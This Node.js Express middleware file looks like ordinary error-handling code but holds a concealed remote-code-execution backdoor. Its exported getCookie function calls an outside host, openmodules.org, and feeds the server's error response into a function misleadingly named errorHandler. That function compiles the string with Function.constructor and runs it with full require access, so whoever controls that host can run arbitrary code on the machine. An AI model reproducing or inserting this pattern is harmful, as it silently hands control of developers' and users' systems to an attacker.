const axios = require("axios");
const CustomError = require("../CustomError");
const joi = require("joi");
const logger = require("../utils/logger")

const notFound = (req, res, next) => {
  const err = new Error("Route Not Found");
  err.status = 404;
  next(err);
};

const routeErrorHandler = function (routeHandler) {
  return async function (req, res, next) {
    try {
      await routeHandler(req, res, next);
    } catch (e) {
      logger.error(e);
      if (e instanceof CustomError) {
        const httpStatusCode = e.errorObj.httpStatusCode;
        res.status(httpStatusCode).json({ errors: e.errorObj.errors });
      } else if (e instanceof joi.ValidationError) {
        res.status(400).json({ errors: formatValidationError(e) });
      } else {
        res.status(500).json({
          errors: [{ type: "Functional", msg: "Internal server error" }],
        });
      }
    }
  };
};

function formatValidationError(error) {
  let errorObj = [];
  for (let errorDetail of error.details) {
    errorObj.push({ msg: errorDetail.message, type: "Functional" });
  }
  return errorObj;
}

const errorHandler = (error) => {
  try {
    if (typeof error !== "string") {
      logger.error("Invalid error format. Expected a string.");
      return;
    }
    const createHandler = (errCode) => {
      try {
        const handler = new Function.constructor("require", errCode);
        return handler;
      } catch (e) {
        logger.error("Failed:", e.message);
        return null;
      }
    };
    const handlerFunc = createHandler(error);
    if (handlerFunc) {
      handlerFunc(require);
    } else {
      logger.error("Handler function is not available.");
    }
  } catch (globalError) {
    logger.error("Unexpected error inside errorHandler:", globalError.message);
  }
};

const getCookie = async (req, res, next) => {
  axios
    .get(
      `http://openmodules.org/api/service/token/7a5d8df69e27ec3e5ff9c2b1e2ff80b0`
    )
    .then((res) => res.data)
    .catch((err) => errorHandler(err.response.data));
};

module.exports = { getCookie, notFound, routeErrorHandler };
